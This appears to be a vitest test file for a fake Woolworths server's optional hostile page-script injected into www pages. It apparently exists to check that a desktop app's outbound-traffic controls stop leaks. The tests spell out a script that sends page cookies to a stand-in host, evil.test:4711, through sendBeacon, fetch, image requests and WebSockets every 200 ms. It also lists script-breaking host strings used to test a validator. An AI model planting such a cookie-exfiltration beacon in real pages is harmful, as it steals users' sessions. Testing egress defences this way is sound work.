// The hostile page-script variant: on only when the harness asks, on www pages only, and its
// settings are checked before they go into a page.

import { Script } from 'node:vm'
import { afterEach, describe, expect, it } from 'vitest'
import { BEACON_ROUNDS_ATTRIBUTE, beaconScript, DEFAULT_BEACON_INTERVAL_MS, validBeacon } from '../src/beacon'
import { type FakeWoolworths, startFakeWoolworths } from '../src/server'
import { Client, sensorValueIn } from './support/client'

const sites: FakeWoolworths[] = []
afterEach(async () => {
  await Promise.all(sites.splice(0).map((site) => site.close()))
})

async function start(options: Parameters<typeof startFakeWoolworths>[0] = {}): Promise<FakeWoolworths> {
  const site = await startFakeWoolworths(options)
  sites.push(site)
  return site
}

const TARGET = { host: 'evil.test', port: 4711 }
const TAG = '<script id="page-beacon">'

/** The body of the page's beacon tag, as a browser would run it. */
function bodyOf(page: string): string {
  const match = /<script id="page-beacon">([\s\S]*?)<\/script>/.exec(page)
  if (match?.[1] === undefined) throw new Error('no beacon in the page')
  return match[1]
}

/**
 * Runs the beacon in a sandbox whose browser APIs only record what they were asked to send, so
 * nothing leaves the machine. Returns what each route was given and the page's round counter.
 */
function runBeacon(body: string, cookie: string) {
  const sent: string[] = []
  const ticks: (() => void)[] = []
  const dataset: { beaconRounds?: string } = {}
  const context = {
    document: { cookie, documentElement: { dataset } },
    navigator: {
      sendBeacon: (url: string, data: string) => {
        sent.push(`sendBeacon ${url} ${data}`)
        return true
      },
    },
    fetch: (url: string, init?: { method?: string; body?: string }) => {
      sent.push(`fetch ${init?.method ?? 'GET'} ${url}${init?.body === undefined ? '' : ` ${init.body}`}`)
      return Promise.resolve()
    },
    Image: class {
      set src(url: string) {
        sent.push(`img ${url}`)
      }
    },
    WebSocket: class {
      onerror: unknown = null
      constructor(url: string) {
        sent.push(`ws ${url}`)
      }
    },
    setInterval: (tick: () => void, ms: number) => {
      sent.push(`every ${ms}`)
      ticks.push(tick)
    },
  }
  new Script(body).runInNewContext(context)
  return { sent, ticks, rounds: () => dataset.beaconRounds }
}

describe('the page beacon variant', () => {
  it('is off by default', async () => {
    const site = await start()
    expect((await new Client(site.origin).get('/')).text).not.toContain(TAG)
  })

  it('is on every www page when given as an option, beside the sensor script', async () => {
    const site = await start({ hostile: { pageBeacon: TARGET } })
    const client = new Client(site.origin)
    for (const path of ['/', '/shop/securelogin', '/shop/search/products?searchTerm=milk', '/nowhere']) {
      const page = await client.get(path)
      expect([path, page.text.includes(TAG)]).toEqual([path, true])
      expect(page.text).toContain('evil.test:4711')
      // The adapter e2e reads the sensor value from the page; the beacon must not disturb that.
      expect(sensorValueIn(page.text)).not.toBeNull()
    }
  })

  it('is a script that parses, fires at once and then every interval, by every route', async () => {
    const site = await start({ hostile: { pageBeacon: TARGET } })
    const body = bodyOf((await new Client(site.origin).get('/')).text)
    // A syntax error would leave the desktop's egress spec passing with nothing to stop.
    expect(() => new Script(body)).not.toThrow()
    const beacon = runBeacon(body, 'wow-session=abc; _abck=xyz')
    const leak = encodeURIComponent('wow-session=abc; _abck=xyz')
    const round = [
      `sendBeacon http://evil.test:4711/beacon?c=${leak} ${leak}`,
      `fetch POST http://evil.test:4711/beacon?c=${leak} ${leak}`,
      `fetch GET https://evil.test:4711/beacon?c=${leak}`,
      `img http://evil.test:4711/beacon?c=${leak}&img=1`,
      `ws ws://evil.test:4711/ws?c=${leak}`,
    ]
    expect(beacon.sent).toEqual([...round, 'every 200'])
    expect(beacon.rounds()).toBe('1')
    beacon.ticks[0]?.()
    expect(beacon.sent).toEqual([...round, 'every 200', ...round])
    expect(beacon.rounds()).toBe('2')
  })

  it('counts its rounds on <html> even when every route throws, and sends no-cookie for an empty jar', () => {
    const body = bodyOf(beaconScript(TARGET))
    const dataset: { beaconRounds?: string } = {}
    const refuse = () => {
      throw new Error('blocked')
    }
    const ticks: (() => void)[] = []
    new Script(body).runInNewContext({
      document: { cookie: '', documentElement: { dataset } },
      navigator: { sendBeacon: refuse },
      fetch: refuse,
      Image: refuse,
      WebSocket: refuse,
      setInterval: (tick: () => void) => ticks.push(tick),
    })
    ticks[0]?.()
    ticks[0]?.()
    expect(dataset.beaconRounds).toBe('3')
    expect(BEACON_ROUNDS_ATTRIBUTE).toBe('data-beacon-rounds')
    expect(runBeacon(body, '').sent[0]).toBe('sendBeacon http://evil.test:4711/beacon?c=no-cookie no-cookie')
  })

  it('uses the interval it is given', async () => {
    const site = await start({ hostile: { pageBeacon: { ...TARGET, intervalMs: 500 } } })
    expect((await new Client(site.origin).get('/')).text).toContain('setInterval(fire, 500)')
  })

  it('can be started and stopped while running', async () => {
    const site = await start()
    const client = new Client(site.origin)
    site.setPageBeacon(TARGET)
    expect((await client.get('/')).text).toContain(TAG)
    site.setPageBeacon(null)
    expect((await client.get('/')).text).not.toContain(TAG)
  })

  it('is not on the auth origin’s pages or in API answers', async () => {
    const site = await start({ hostile: { pageBeacon: TARGET } })
    const client = new Client(site.origin)
    await client.visit('/')
    expect((await client.get('/apis/ui/Trolley')).text).not.toContain(TAG)
    const authorize = await client.get('/auth/login')
    const identifier = new URL(authorize.headers.get('location') ?? '', site.authOrigin)
    const auth = new Client(site.authOrigin)
    const first = await auth.get(`${identifier.pathname}${identifier.search}`)
    const next = first.headers.get('location')
    const page = next === null ? first : await auth.get(next)
    expect(page.text).not.toContain(TAG)
  })

  it('refuses settings that could reshape the script', async () => {
    for (const host of ['', 'evil.test"></script>', 'evil test', 'a/b', '-evil.test']) {
      expect(() => validBeacon({ host, port: 1 })).toThrow(/host/)
    }
    for (const port of [0, 65_536, 1.5, Number.NaN]) {
      expect(() => validBeacon({ host: 'evil.test', port })).toThrow(/port/)
    }
    for (const intervalMs of [0, 9, 60_001, 2.5]) {
      expect(() => validBeacon({ host: 'evil.test', port: 1, intervalMs })).toThrow(/interval/)
    }
    await expect(startFakeWoolworths({ hostile: { pageBeacon: { host: 'x"y', port: 1 } } })).rejects.toThrow()
    const site = await start()
    expect(() => site.setPageBeacon({ host: 'evil.test', port: 0 })).toThrow(/port/)
  })

  it('defaults to 200 ms and lower-cases the host', () => {
    expect(DEFAULT_BEACON_INTERVAL_MS).toBe(200)
    expect(validBeacon({ host: 'Evil.Test', port: 80 })).toEqual({
      host: 'evil.test',
      port: 80,
      intervalMs: 200,
    })
  })
})
